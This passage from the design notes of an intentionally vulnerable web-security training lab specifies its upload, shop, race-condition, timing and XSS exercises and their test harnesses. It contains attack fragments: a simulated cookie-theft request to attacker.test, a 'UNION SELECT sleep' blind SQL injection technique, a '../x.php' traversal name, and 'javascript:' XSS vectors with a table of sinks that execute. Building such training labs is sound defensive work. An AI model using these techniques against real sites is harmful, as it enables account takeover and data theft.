container. **Size the placeholder with CSS on the lab page**: its logical screen can be up to 65535 x 65535, which a
browser lays out (and may try to decode) at that size, so give the `<img>` a fixed box, e.g.
`<img src="..." alt="" style="width: 8rem; height: 8rem; object-fit: contain">`, never its intrinsic size. SVG is not
a raster: `looksLikeImage(svg)` is false.

SC-09 (`scriptorium/sc-09-polyglot-image/`) is the worked example, on the scroll desk with `preview: true`: Acolyte
accepts what the upload's Content-Type claims, Inquisitor what `looksLikeImage` accepts (both keep the uploader's name
and bytes, and the server runs a stored `.php`), and Divine stores `placeholderImage(sniffImage(bytes))` under a
server-made `.gif` name and runs nothing. It takes the `<?hvwa CANARY ?>`-tail path only: no level serves player
markup, so it needs no XSS victim, and its spec uses the oracle to show that no level's page renders an upload. Its
spec pins Divine's stored file to the exact placeholder bytes (a Divine that kept the player's bytes under a safe name
would pass every exploit case), and unit-tests Divine's "never runs" on a planted `.php` that no upload can produce.

### "Execution": `simInterpret(bytes, canary)`, and why nothing runs

Whether a stored file "runs" is **the level's decision**: its flawed name or type mapping (`.php` anywhere, the first
extension, a sniffed type). It is made before `simInterpret` is called. `simInterpret` answers what running the file
prints. It scans the bytes (as Latin-1, so binary files work) for the one statement the simulated interpreter knows,
`<?hvwa CANARY ?>` (`SIM_SCRIPT_STATEMENT`), anywhere in the file, so a polyglot's tail counts. If the statement is
there, the output is the canary alone; if not, it is `null` ("printed nothing"). Pass the canary lazily,
`simInterpret(file.bytes, () => flagFor(req, C))`, so no flag is computed for a file without the statement. The
uploaded bytes are never echoed. The lab page documents the statement (it is the simulated server's language). Hints
still never contain a payload.

**No uploaded file or template ever runs for real**: no PHP, EJS or Node, and no `eval`, `vm`, `child_process` or
worker. A real interpreter would be remote code execution on the host's container, and the "webshell" lesson does not
need one. The lesson is the upload **filter**, and the token oracle proves it was beaten. The guard spec keeps it that
way.

### Serving uploads to the player's real browser

The simulated server's answer is shown, never re-enacted. **Never send uploaded bytes to the player's browser as an
active type**, whatever was claimed or sniffed. A route that hands a stored file back sends `Content-Type:
application/octet-stream`, `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` and
`Content-Security-Policy: sandbox`. What the simulated server would have sent (its content type, whether the file
ran, what it printed) goes on a lab page as escaped text. An SVG or HTML payload that must be seen firing (SC-05)
goes only through E0's sandboxed preview frame. The one other way out is the scroll desk's **raster preview** (below):
a file whose bytes start like a PNG, JPEG, GIF or WebP, sent as the type that header names (never the claim), with
`nosniff` and a CSP `sandbox`, and drawn in a fixed CSS box. A raster image of its own type never runs script.

### The Scroll Desk (`scriptorium/_shared/desk.ts`: SC-07, SC-08, SC-09)

A shell for the upload-filter labs: the uploader page, `POST /` (the upload), `GET /uploads?name=` (the simulated
archive server: the inert download, or the interpreter's output when the level says the file runs) and, opt-in,
`GET /preview?name=`. Every decision is a `DeskLevel` callback in the lab's `levels/*.ts`: `store(fs, file)` (refuse,
or write and say where) and `serve(fs, name)` (find the file, and whether it runs). `mountDesk(router, options)`:

- `newDesk({ seed?, separators? })` in the `perSession` factory: a `simFs` with one pinned seed under `/srv/uploads`
  (default `README.txt`, "Scrolls go here."; SC-09 seeds a server-made sample image) and the simulated OS's separators.
- `partial` (an absolute `.ejs` path) and `extra(req, res)`: the lab's own content, drawn under the message. The
  partial sees the desk's view data plus `extra` (one key, so it never collides with the desk's or the engine's keys)
  and escapes its own values. Display only: no filter or decision lives there.
- `statementNote` (default true): the note on `<?hvwa CANARY ?>`. A desk whose server runs files keeps it.
- `preview` (default false): `GET /preview?name=` looks the file up with the level's `serve` (never running it) and
  serves only a raster, as the type its header names, `nosniff` and `Content-Security-Policy: sandbox`; anything else
  is a plain-text 404. **At Divine it sends `placeholderImage(sniff)`**, never a stored byte, so the secure reference
  never shows the player's bytes even if a level kept them. The page draws each raster file as
  `<img class="desk-preview" ... width="128" height="128" style="width: 8rem; height: 8rem; object-fit: contain">`.
- The test kit `describeDeskBasics({ challenge, path, heading, labFor, seed?, accepted?, preview? })`: `seed` is the
  lab's seed (name and body), `accepted` the content type and body prefix the lab's Acolyte and Divine store (an image
  lab claims an image type and starts with an image header), `preview` whether the route exists. The options' own cases
  are in `tests/desk-shell.spec.ts` (fixture lab DK-01).

### Testing

`tests/support/uploads.ts`:

- `multipart(parts, boundary?)` writes a body byte by byte. Use it, not superagent's `.attach()`, which takes the
  basename of a filename, so `../x.php` arrives as `x.php`. Send it with
  `.set('Content-Type', m.contentType).send(m.body)`.
- `uploadReq(m)` is the `{ headers, body }` `parseMultipart` reads.
- `zipOf(items, opts?)` writes an archive with any names, and with headers that can lie (sizes, CRC, offsets, counts).

Real-writer archives are in `tests/fixtures/upload/` (Python `zipfile`, with and without data descriptors). Test seam:
`labFor({ sessionId: sid, level }).fs.list()`. Add the lab-specific cases: each level's name trick and the next level
refusing it, names shown escaped, Divine's stored names, the sentinel unchanged after a refused extraction, and an
upload served back as an inert download.

## 10. The Relic Market shop shell (`relic-market/_shared/`)

The shop labs (RM-05, 06, 07, 08, 09, 10, 13, 14) share a shell of plumbing. Every parse rule, check, rounding rule,
lock and price decision stays in the lab's `levels/*.ts`; the shell stores what the level decided and enforces only
platform bounds. Worked examples: RM-05 (cart lines and returns), RM-09 (level-made hidden form fields, a public JSON
API), RM-14 (cart totals computed by the level's own arithmetic).

**Money** is integer minor units in JS numbers that are always safe integers: US cents, whole crowns or whole rupiah.
`formatMoney(amount, currency = 'USD')` is the one formatter (`$1,000.00`, `-$10.00`, `₡5`, `IDR 162,500`), exact for
every integer (BigInt), and it throws on a fractional, NaN or infinite amount. No level formats money itself: a level
that names an amount calls `formatMoney`, or `insufficientFunds(total, wallet)` for the usual checkout refusal.

**State.** `newShop({ catalog, wallet })` is a `ShopState`: `catalog`, `startWallet`, `wallet`, `cart`, `discounts`,
`orders`, `pinned`, `nextOrderNo`, `clock`, `gate` and `locks` (section 11). A lab extends it, typed (never `as`), and keeps it
in `perShop`:

```ts
// model.ts
export interface LabState extends ShopState { readonly owned: Map<string, number> }
const labs = perShop((): LabState => ({ ...newShop({ catalog: CATALOG, wallet: 5000 }), owned: new Map() }));
export const labFor = (req: { sessionId: string; level: Level }): LabState => labs.for(req);
export const labState = (sessionId: string, level: Level): LabState => labs.for({ sessionId, level }); // test seam
export const resetLab = (req: { sessionId: string; level: Level }): void => { labs.reset(req); };
```

- `perShop(factory, opts?)` is `perSession` with `maxEntries: SHOP_MAX_ENTRIES` (1000) unless the lab passes its own.
  A fully used shop is about 20-25 KB, so the engine's default 5000 entries would be about 125 MB a lab. Every RM
  shop lab uses it.
- `catalogOf(products)` is frozen and looked up in a `Map`, so `constructor` is no product. Every route checks the
  SKU against it (`Unknown product.`) before a level sees it, so maps keyed by SKU only ever hold catalog SKUs.
- The shopper is already signed in as `pilgrim` (`CUSTOMER`, customer `C-1042`): no sign-in form (decision Q9).

**Cart and orders.**

- `setLine(state, line)` **sets** the quantity of that SKU's line (a return line, `kind: 'return'`, is a line of its
  own); 0 removes it. It stores the level's decision as given, negative quantities and prices included. Platform
  bounds: |qty| ≤ 9 999 999 999 (`Quantity too large for this shop.`) and 20 lines (`Your cart is full (20 lines).`);
  a fractional quantity or an unsafe unit price is a programming error and throws. A lab that adds up (RM-05's
  returns) computes the new quantity itself and sets it.
- `placeOrder(state, { lines: orderLines(state), subtotal, total, charged, status? })` places an order (status `paid`
  unless the lab names another), debits `charged` (a negative charge
  credits), stamps the order with `state.clock.now()`, empties the cart and the discounts and keeps the newest 30
  orders (`pushOrder`). A charge or wallet outside the safe integers is refused (`OUT_OF_RANGE`) and changes nothing.
  Whether the order may be placed is the level's decision, made before (`checkoutAllowed`, ...). RM-13 does not call
  `placeOrder`: its payment provider has already debited the wallet at the pay step, so it builds its `confirmed` order by
  hand (`pushOrder`, no debit) with `charged` set to the provider's ledger (`received`), avoiding a double debit.
- **Seeded orders** (RM-11's other customers) go through `pinOrder(state, order)` in the lab's factory into
  `state.pinned` (at most `LIMITS.pinned` = 20, an id seeded twice throws): they are never trimmed by the player's own
  newest 30. `allOrders(state)` is pinned then own. An `Order.no` is a number (the shop's running number) or a string id.
  `ordersView` lists only orders with `owner === CUSTOMER.id` (pinned ones included), so a seeded foreign order never
  shows in "Your orders"; a lab that shows foreign data does it on its own page, by its own level's rule.
- An `OrderLine` keeps `qty`, `unitPrice` (what was charged) and `listPrice` (the catalog's, then), so a proof never
  reads the current catalog. `exactValue(lines)` is their real worth in BigInt.
- `exactTotals(state)` (and `cartTotal`) are exact cart totals, `OUT_OF_RANGE` beyond the safe integers. A lab whose
  lesson is the arithmetic (RM-14) builds its `CartTotals` with its levels instead.
- More bounds: `addDiscount(state, d)` (10 discounts, `Too many promotions on this cart (10).`), `pushHistory(list,
  entry)` (the newest 30), and `clipText(s)` for every free-text field a lab **stores** (100 characters, a copy made
  with the engine's copying clip). `sql.ts` `clip` slices, and a slice can keep its whole parent string alive, so it
  is for display cells only.

**Routes: intents.** Every form on `GET /` posts back with no `action` and a hidden `intent`; each intent also has a
named path for curl and scripts:

```ts
// challenge.ts
const INTENTS: Readonly<Record<string, Intent>> = {
  add: { path: '/cart', fields: ['sku', 'qty'], run: add }, // run(req, res) => Outcome { result, status? }
  remove: removeLineIntent(labFor),                          // the cart's Remove button, the same at every level
  checkout: { path: '/checkout', run: checkout },
};
// in mount(router):
router.get('/', async (req, res) => { await render(req, res, { result: null }); });
mountIntents(router, INTENTS, render);
```

- `mountIntents` mounts `POST /` (dispatch on `field(req, 'intent')`; a missing, unknown or non-string intent is 200
  `Unknown action.`, never a 500) and `POST <path>` per intent, then calls `render(req, res, outcome)` with
  `outcome.intent` set to the intent that ran. It throws at mount time on a relative or repeated path, on `/`, and on
  the engine's `/_reset` and `/victim/...`. `fields` is documentation for the endpoint list.
- `refusal(text)` and `success(text)` build an `Outcome`.

**The page.** `render` builds the view data with `shopView(req, res, state, spec)`:

```ts
await sendPage(res, view, shopView(req, res, state, {
  challenge: RM05, result: outcome.result, intent: outcome.intent, totals: exactTotals(state), proves,
  removable: true, endpoints: endpointsOf(INTENTS), curl: { path: '/cart', form: { sku: 'ROSARY', qty: '1' }, signIn: false },
  // fields: (p) => level.formFields(p), api: [{ path: '/api/price-lists', description: '...' }], extra: { ... },
  // an API path with a parameter links to its example: { path: '/api/orders/:id', example: '/api/orders/1001', description }
}));
```

- `shopView` is `baseView` (header data, message, `kept`, curl, endpoint list, API box) plus `catalogView`,
  `cartView` and `ordersView`. A page without a cart (store credit, an exchange, an API landing page) uses
  `baseView(req, res, { result, curl, endpoints?, api?, wallet?, intent?, extra? })` and the parts it has.
- A lab whose checkout has several steps (RM-13) names the cart button's intent with `checkoutIntent: 'start'` (`shopView`
  spec or `cartView` option; default `checkout`), so the cart partial's form posts that intent.
- `kept` is what was posted (`intent`, `sku`, `qty`): a product's quantity field keeps it only after an `add` of
  that product, and a lab's own form keeps its value only after its own intent.
- A lab without a cart (RM-08 store credit, RM-10 money changer) renders `{ ...baseView(...), ...ordersView(...) }` (or
  only `baseView`) with its own view. Its history keeps the shell's hooks, so `describeShopBasics({ hasCart: false,
  purchase })` reads it: RM-08's purchases are real orders (`pushOrder`), RM-10's exchanges are `<li data-order
  data-total data-charged data-status="exchanged">` numbered with `nextOrderNo` and kept to the newest 30 with
  `pushHistory`. The flag of a lab whose proof is a balance sits in the page's own line (`flagLine(req, challenge)`),
  and a proof that a later action could undo (RM-10's net worth) is recorded once, in the state, when it first holds.
- Views compose the partials in `relic-market/_shared/views/` (`shop-header`, `message`, `catalog`, `cart`, `orders`,
  `api`, `endpoints`, `staff-code`) with the curl note, e.g. `<%- include('../../_shared/views/cart') %>`. `served`
  is the level (`level` is a reserved view key); `heading` goes to `shop-header` only (a page-level `title` would
  replace the page's `<title>`).
- The header always says `Signed in as <code>pilgrim</code>` (the `account` regex of `describeLabView`); pass
  `signIn: false` to `curlFor`. Machine-readable hooks for tests: `data-testid="wallet" data-cents`,
  `<li data-order data-total data-charged data-status>`, `<tr data-sku data-qty data-line data-kind>`,
  `data-testid="cart-total"`, `data-testid="endpoints"`.

**The proof and the flag.** The flag is shown only for a recorded fact that proves the flaw: a paid order, a balance,
a result row. Each lab defines it as `proves(order)` (or a predicate on its state) in `model.ts`: it is the oracle,
not the flaw, so it is never in a level file, and it reads the order, never the current catalog. `ordersView` adds
`flagLine(req, challenge)` (`Flag: …`, or `''` at Divine) to every order it holds for, outside any `tryDb`, so the
proof stays visible on the order row after the action that made it. Divine never shows a flag.

**Restart (decision Q8).** No RM lab has a limiter, lockout or attempt budget. The labs whose wallet, voucher or
workflow can be spent into a dead end (RM-05, 06, 07, 08, 09, 10, 13, 14) pass `reset: (req) => { resetLab(req); }`;
RM-01 to 04, 11 and 12 mutate nothing and have none (`POST <lab>/_reset` is 404). Every proof is measured against the
current instance (its own `startWallet`, its own voucher), so a reset never helps an exploit. Each spec asserts that
Restart restores the start wallet and empties the cart and the orders, and that the flag can still be earned after it.

**Testing: `shop-lab.testkit.ts`.**

- `shopClient(path)`: `ctx(level)`, `home(c)`, `form(c, body)` (a page form), `post(c, sub, body?)` (a named path),
  `add(c, sku, qty, extra?)`, `checkout(c)`, `restart(c)`. The matrix's `send` hands a script its `ShopCtx`:
  `send: (agent, level, script, _url, { sid, app }) => script({ agent, level, sid, app })`.
- `describeShopBasics({ challenge, path, labState, hasRestart, purchase?, hasCart? })`: GET at every level, a purchase
  isolated per player and per level, Restart (and its 429 cooldown) or a 404, the 21st cart line, the newest 30
  orders, money formatting. The default purchase is the cheapest product with its own form, then checkout; a lab
  without a cart passes its own `purchase` and `hasCart: false`.
- Readers: `walletOf`, `ordersOf` (numeric ids; `orderIdsOf` reads string ids too), `cartOf`, `productForm(html, sku)` (a product form's fields, as a browser posts
  them), `pricesOf`, `endpointsShown`.
- Exploit scripts end on checkout, and Divine's answer to each is `Insufficient funds: …` (`resisted` is the text, or
  a map keyed by the exploit's level when the totals differ).
- A defense no Divine request can reach over HTTP (RM-14's exact multiply past INT32) is unit-tested on the level
  module, or the mutant that drops it survives.

## 11. Race labs (RM-07, RM-08)

Real in production, deterministic in tests (`relic-market/_shared/race.ts` and the test kit).

- A racy level is `check -> await state.gate.pass(WINDOW_MS) -> update`. In production `state.gate` is
  `waitGate(realClock)`: `pass(ms)` is a real timer (clamped to 0-5000 ms), so two requests that arrive within the
  window really interleave on the event loop. Nothing about the race itself is simulated.
- **The route calls `state.gate.arrive()` as its first statement, right before the level**, and before any
  `state.locks.run(...)`, so a request queued on a lock still counts. **A racy level function does no `await` before
  its check**: arrival, check and the await then run in one synchronous segment.
- Locks: `state.locks` is a `KeyedMutex` (FIFO per key, idle keys deleted) on the shop, so it is per player and level,
  and a Restart or an eviction drops it. Callers pass constant keys only. Never a module-level mutex.
- Tests install `barrierGate(n, fallbackMs = 2000)` on one session's state (`labState(sid, level).gate =
  barrier.gate`) and fire the race with `Promise.all`. `pass()` resolves once n requests have **arrived** (not reached
  `pass`), so every request has done its check before any does its update, and a Divine request refused before `pass`
  still counts, so the barrier never deadlocks. Released passes resume in a later **macrotask** (`setImmediate`), after
  every microtask the last arrival queued: a locking level's check starts one microtask after `arrive()` (the
  `state.locks.run` hop), and a barrier that resumed in a microtask would let the first request write before the second
  one's check (RM-08 Inquisitor's buy against gift). Assert `timedOut() === false`: the fallback fires only on a
  regression.
  - **Atomic Divine, two ways.** RM-07 reserves in the check's own synchronous step (mark the voucher used before the
    first `await`, give it back in `finally`); RM-08 funnels every spending path through one synchronous `debit`
    (check and subtract, refund on failure). Both need no lock, and the same barrier test proves them: exactly one of
    N parallel requests succeeds. A mutant that moves the write after the await goes red.
  - **Install the barrier right before the race**, after the set-up requests: a set-up request that goes through a
    racy route counts as an arrival and spends the barrier before the race starts.
  - **Install it again after a Restart**: Restart builds a fresh state, whose gate is the real `waitGate` again.
  - Legit and other non-race cases run with `useInstantWaits()` in their describe block, so no test waits real time.

## 12. Time-based labs (RM-03)

- A delay is simulated on the injectable clock (`relic-market/_shared/clock.ts`), never a `setTimeout` in a level and
  never genuinely slow SQL (rule (g)). The route evaluates the injected condition synchronously (e.g. a `sleep()` SQL
  function that only adds to an accumulator, capped), then `await realClock.wait(delayMs)` and answers.
- `realClock.wait(ms)` is a real `setTimeout` **clamped to 0-5000 ms** (`MAX_WAIT_MS`; NaN is 0), so no request can be
  parked longer, and `realClock.now()` is `Date.now()`. Both delegate to whatever `setClockForTests` installed, so
  holders made at import time follow a swap.
- Tests call `useFakeClock()` in their describe block: `realClock.wait(ms)` then advances virtual time by the clamped
  ms and resolves at once, and the returned `now()` reads it. An exploit script measures `now()` before and after each
  request: the delay is exact and the test instant (decide with `dt >= 1000`). `useInstantWaits()` makes waits instant
  without moving time.
- Players measure real time with `curl -o /dev/null -s -w '%{time_total}\n' …`.
- **What RM-03 (`rm-03-blind-time-sqli`) uses, the worked example:**
  - **A provided `sleep(seconds)` SQL function** (the MySQL-style helper the page announces), registered in the seed on
    the raw handle: `raw.function('sleep', { directOnly: true }, fn)`. It never blocks: it adds
    `clamp(seconds, 0, 5) * 1000` ms to the lab's accumulator (`delay.ms`, capped at `MAX_WAIT_MS`) and returns 0. It
    takes a number or numeric text only (a blob, NULL or junk is 0), and a negative never cancels another sleep.
    The seed registers nothing else: `randomblob()`/`zeroblob()` are capped by the engine (section 4).
  - **`measured(level, run)`** in `model.ts` resets the accumulator, runs the query, reads it, and resets it again in a
    `finally`. `node:sqlite` is synchronous, so no other request runs between the reset and the read: the accumulator
    can live on a `perLevel` instance, and the function that wraps the query must not `await` inside it.
  - **The route** wraps `tryDb` in `measured`, so a query that sleeps and then fails still reports its delay, then
    `await realClock.wait(delayMs)` and answers. The answer is the same bytes for a hit, a miss and an error; only a
    refused input says so. A database error is that uniform answer, never its message: blind labs (RM-02, RM-03) hide
    DB text at EVERY level (decision Q4), say so in `divine.ts`, use `malformed: []` and add an explicit "no database
    text at any level" case.
  - **The tests** call `useFakeClock()` once at the top of the spec file (it uses `beforeAll`/`afterAll`) and wrap each
    probe: `t0 = clock.now()`, the request, `dt = clock.now() - t0`. A true condition is exactly 2000 ms and a false one
    0, so the oracle is `dt >= 1000` and the exploit script binary-searches the hex alphabet (4 requests a character)
    and then redeems. Lab-specific cases to copy: true costs 2000 and false 0 at every exploitable level, Divine never
    delays, the 5000 ms cap, odd `sleep()` arguments, a failing query leaves no stale delay, `sleep()` itself never
    blocks (a direct call takes no real time), and the answer's bytes do not depend on the data.
  - **Pitfalls.** Use the `UNION SELECT sleep(...)` form: it runs `sleep` exactly once. An `AND`/`OR` form runs it once per
    scanned row, or never when a literal has a trailing newline, so neither the hints nor the tests may depend on row
    counts. Never `setTimeout` in a level and never rely on a genuinely slow query (rule (g)).

## 13. XSS labs (`core/xss`)

An XSS lab is a victim-driven lab (section 8) whose proof is "the admin's browser ran your script". The simulated
browser runs no JavaScript, and **no player JavaScript ever runs in the server process**. A static oracle decides
instead: parse5, the HTML5 tree builder browsers use, parses the exact bytes the admin's browser received, and a rules
table (`core/xss/rules.ts`) says whether attacker bytes made a sink that would run the player's **marker call**
`hvwa('<nonce>')`. The nonce is per player and level. Where a real payload would send `document.cookie` home, the
player calls the marker. The worked example is the fixture lab XV-01 in `tests/xss-lab.spec.ts`, a reflected search at
four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.ts`.

### The recipe

1. **Declare the sink in the level file.** The level builds the one fragment the lesson is about, escaping it or not
   (section 5): `results(q): string`, `renderReview(body)`, `renderMarkdown(src)`. **One function serves both
   browsers.** The citadel handler puts it in the admin's page, and the real route puts it in the player's preview, so
   the oracle judges exactly what the player watches.
2. **Keep the marker and the admin in the lab's `perSession` state.** Make both in the factory, next to the world:

   ```ts
   const labs = perSession((level): LabState => {
     const world = simWorld();
     const marker = newMarker(); // 16 CSPRNG hex digits; throws outside a perSession factory
     const key = newId();         // the admin's session: what the payload steals
     const state: LabState = {
       world, marker, key,
       // The canary is read once the browser has the page's cookies: a signed-out admin has nothing to steal.
       admin: xssBrowser(world, (r) => citadel(level, state, r), { marker: marker.call, canary: () => state.admin.cookies.get(SESSION) ?? '' }),
     };
     state.admin.cookies.set(SESSION, key); // already signed in
     return state;
   });
   ```

   `xssBrowser` is `world.browser(handler)` with one addition. Every page it renders goes through
   `xssOracle(body, marker)` first, before the browser sees the answer, which is unchanged. A rendered page is any
   answer except a followed redirect, of a type a browser renders as a document, and not a download. When the payload
   runs, exactly one request lands in the player's attacker log: `GET http://attacker.test/steal?c=<canary>`, with no
   Referer. The canary is read once the browser has stored that page's own `Set-Cookie`, and before the next page
   answers: at the visit's next request (before its handler runs), or when the visit ends. So a later page that
   rotates the session does not change what was stolen. A `Refresh` hop straight to attacker.test is logged before it.
3. **Render the preview.** The view shows the marker (escaped), the player's input (escaped, in the lab chrome) and
   one raw value, the preview: `preview = previewFrame(level.results(q), { marker: state.marker.call, title })`, output
   with `<%- preview %>`. Never output the raw fragment anywhere else on the page.
4. **Wire the victim.** Use the usual presets with the XSS browser. `sendLinkAction` covers reflected and DOM XSS ("the
   admin opens the link you send"). For stored XSS, `checkMailAction` or a custom action (`run` follows `/scroll`, the
   page that renders the stored payload). Pass a REQUIRED `rearm` that signs the admin back in (section 8). Stored
   payloads live in `perSession` state, bounded (cap reviews and keep the newest). A stored payload can wedge the view,
   so these labs may define `reset` (they have no limiter).
5. **Prove the flag.** The player reads the canary from their attacker log and completes the attack on the real lab:
   signs in with the stolen session, or submits it. That route calls `flagFor`. At Divine the fragment is escaped, so
   nothing fires and no canary arrives. The flag never comes from the preview: what the player sees there is
   decorative.

**Two rules every XSS lab keeps (plan amendments after the E0 review):**

- **Never place player input inside `<script>` or event-handler code, at any level.** The oracle does not parse
  JavaScript, so it cannot judge JS-string escaping: a marker call inside a JS string or a JS comment counts as running
  (pinned in `tests/xss.spec.ts`, "the marker inside JavaScript"). Put player input in HTML contexts only (text,
  attribute values, URLs), where the oracle is exact.
- **A level whose only fix is a CSP is not a Divine.** Only CSP `sandbox` is modelled; other directives are not
  evaluated. Divine encodes or sanitizes correctly, and a CSP is defence in depth.
- **A level that serves player XML refuses any DOCTYPE with an internal subset, at least at Divine** (plan amendment
  after the E0 re-review). The oracle refuses a DTD that declares entities or attribute defaults (`limited: 'dtd'`,
  under "Served markup" below), so no intended solve may depend on a DTD, and the lab's spec asserts that Divine never
  produces `limited: 'dtd'`.

### What the oracle counts

`xssOracle(html, marker, { insertion?, interact?, sandbox?, syntax? })` answers `{ executes, sinks, reachedMarker,
mxss, limited?, wellFormed? }`. `executes` is true when a sink whose code contains the marker call would run in the
page's origin. Every row below was checked in headless Chrome 157: about 380 cases in both insertion modes, plus XML
documents and `data:` images. The only rows that differ are ones a harness cannot drive (opening a `<details>` that
has no `<summary>`).

| Sink row | Runs (examples) | Does not run (examples) |
|---|---|---|
| element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` (a classic script runs whatever the data type) | `type=text/plain`, a type with parameters, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
| attribute (`event-handler`), on load | `onerror` on a source that fails (`src=x`, a broken `data:` image); `onload` on a `data:` source that decodes, a frame, a style, an `<svg>`, the body; a stylesheet, a preload with `as`, a modulepreload or a prefetch link; a default `<track>` of a `<video>` or `<audio>`; `autofocus` + `onfocus`; `details open` + `ontoggle`; SMIL `onbegin`/`onend`; CSS animation events with an inline animation and a `@keyframes` rule; `content-visibility: auto` | unknown names (`onfoo`), `data-onload`; `onerror` on a `data:` image that decodes, on an icon link, a bare preload, an embed, an iframe or a text input; a `<track>` without `default` or outside a media element; `onload` on SVG children (`g`, `rect`); window events on anything but `body` |
| attribute, on interaction | `onmouseover`, `onclick`; `onfocus` on an element that can take focus; transition events | `onfocus` on one that cannot |
| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`, on `formaction` of a submit button with a form owner (interaction; see below), on `iframe src` (load); SMIL `href` animation of an SVG link (`<animate attributeName=href values="javascript:...">`, on click); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object`/`embed`, `math href`, `meta refresh`, `base`, top-level `data:` links; `formaction` on `type=button`/`reset`, a text input, or with no form owner; `attributeName=xlink:href`; a `data:` frame runs, but `isolated` |
| `srcdoc` | the framed document's own sinks, in the page's origin | a `sandbox` without `allow-scripts`; with `allow-scripts` alone the sinks are `isolated` |
| SVG (`svg-script`) | `<svg><script>` (entities decoded), `foreignObject` and MathML `mtext` switching back to HTML | scripts inserted by innerHTML |
| declarative shadow DOM | a page's `<template shadowrootmode=open\|closed>` (any case) on a host that can take one (HTML's valid shadow hosts, a custom element, the body), the first per host: its content is live | innerHTML; an `<a>` host; a second template; any other mode; template content otherwise (inert) |
| customizable `<select>` | markup inside a select (Chrome 135+ keeps it; parse5 8.0.1 drops it): a second pass reads the page with select renamed, and every framed document it holds once decoded (a select in an entity-encoded `srcdoc`), and its sinks count | text and attributes that only mention `<select` |
| style | none: CSS is never script; `<svg><style><img onerror>` runs only because the img breaks out of foreign content | `<style>`, `style=url(javascript:...)`, `@import 'javascript:'` |

- **The marker** must appear literally in the sink's code, in any quote style, with spaces, or as a method call
  (`window.hvwa("n")`), and on a word boundary (`xhvwa(...)` does not count). The oracle does not parse JavaScript:
  obfuscation it cannot see is not proof, and a marker inside a JS string or comment counts (the first rule above).
  Another player's marker, or another level's, never counts.
- **`reachedMarker`** with `executes: false` means the payload reached the page as text: escaped, in a comment, or
  in an attribute. A lab may say so in a note.
- **Form owners (`formaction`).** A submit button's `formaction` navigates only when the button has a form owner, as
  the HTML parser leaves it. With a `form=` attribute, the owner is the first element with that id, and it must be a
  form: `form=""`, an unknown id or a non-form id means no owner, even inside a form. Without one, an ancestor form
  owns it. Failing that, in a page the parser read (`insertion: 'document'`), the parser's form element pointer does:
  the last `<form>` start tag before the button with no `</form` between them, so
  `<div><form></div><button formaction=javascript:...>` runs. innerHTML keeps no such pointer. Ids inside template
  content do not count.
- **`data:` images** are checked by structure, not decoded. A GIF needs one complete image (its trailer may be
  missing). A PNG needs IHDR first and one complete IDAT (IEND may be missing). A JPEG needs a frame header with a
  non-zero size and the start of a scan (EOI may be missing). A WebP needs its RIFF size and a VP8, VP8L or VP8X chunk.
  Garbage behind a valid signature errors, but the compressed pixels are never decoded: a well-formed file with
  corrupt pixel data counts as loading, so no lab should depend on one. An SVG image must be a well-formed XML
  document with an SVG-namespace `<svg>` root. An SVG that is over 16 KiB or 1024 tag openers, over the XML reader's
  caps, or that has a refused DTD is **not judged**: neither its `onload` nor its `onerror` counts. Each `data:`
  source is judged once per oracle call.
- **`interact`** defaults to true: the admin reads the page and hovers and clicks it. Pass `false` for a victim who
  only loads the page.

### Variants the labs need

- **DOM XSS and prototype pollution (SC-03, FP-11).** The server's page is benign; the lab's own client script writes
  the sink. Give `xssBrowser` a `dom` twin, a function in the level file that mirrors the shipped script. It receives
  each rendered page as `{ url, path, query, hash, status, body }`, where `hash` is `location.hash` exactly as the
  browser has it. The fragment is never sent to the server, and a redirect without its own fragment keeps the link's.
  The twin returns `{ html, insertion? }` for what the script writes. `insertion: 'innerHTML'` (the default) covers
  innerHTML, outerHTML and insertAdjacentHTML: inserted scripts never run or fetch, but handlers do.
  `'document'` covers document.write and createContextualFragment. Keep the twin and the shipped script in lock-step:
  one constant, or a spec over a payload corpus. The preview runs the real script: pass
  `previewFrame(pageHtml + script, { hash })`. A prototype-pollution twin merges into a simulated object and never
  touches the host's `Object.prototype`. (A shared `safeishMerge` helper is engine task E3.) **A twin that throws wrote
  nothing**, as a client script that throws writes nothing: a twin that decodes the hash fails on a malformed `%` escape,
  and the page is still judged on its own (the verdict says `domFailed`). A twin that answers anything but
  `{ html, insertion? }` or undefined is a lab bug, and the action fails.
- **mXSS (SC-06).** `mxss` is true when a parse, serialize, parse round trip adds a marker sink the first parse did
  not have. The round trip is checked with scripting on, and from a scripting-off parse when the page mentions
  `noscript`. Judge the sanitizer's input with it, because that is what the sanitizer saw. The browser then simply
  parses its output, and the victim's page `executes`. For Divine's "re-parse and compare", use
  `roundTrip(html, { insertion: 'innerHTML' })` to reach a fixed point. The known corpora (MathML
  `mglyph`/`style`, the DOMPurify form case, nested `mtext`, noscript) are pinned in `tests/xss.spec.ts` with their
  exact round trips, so a parse5 bump that changes serialization fails there. parse5 uses HTML's classic serializer,
  which does not escape `<` and `>` in attribute values. That is what a server-side parse and serialize sanitizer
  produces.
- **Served markup (SC-05, SC-09).** What the admin's browser renders depends on the response headers. No type,
  `text/html`, `application/xhtml+xml`, `image/svg+xml` or XML are rendered; anything else (`application/octet-stream`,
  `image/png`) and any `Content-Disposition: attachment` are not. **XML types are read as XML** (`syntax: 'xml'`,
  `core/xss/xml.ts`), as Chrome 157 reads them. Namespaces decide what an element is: an `<svg>` without `xmlns` is
  not SVG, and an `<img>` inside SVG is no image. Names are case-sensitive. A not-well-formed document runs only what
  was read before the error: a script whose end tag was read runs, but the root `<svg>`'s `onload` needs the whole
  document well-formed. The verdict says `wellFormed`. The reader keeps Chrome's errors. A name stops at the first
  character that is not an XML name character, so `<!DOCTYPE svg[` stops the read, while `<!DOCTYPE svg [` does
  not. A malformed `<?xml ...?>` declaration stops it too (version first, then encoding, then standalone).
  `xmlns:xml` may only bind the XML namespace, and character references may carry any number of leading zeros.
  **DTDs:** a DOCTYPE whose internal subset contains `<!ENTITY` or `<!ATTLIST` is refused whole
  (`executes: false, limited: 'dtd'`). Chrome expands those entities and applies ATTLIST defaults, so a declared
  `onload` default on `<svg>` runs too, and a static reader can expand neither. Any other subset (`<!ELEMENT>`,
  comments) is read past, and a reference to an undeclared entity stops the read. Hence the rule above: a level that
  serves player XML refuses a DOCTYPE with an internal subset, at least at Divine. (The XXE labs teach DTDs on the
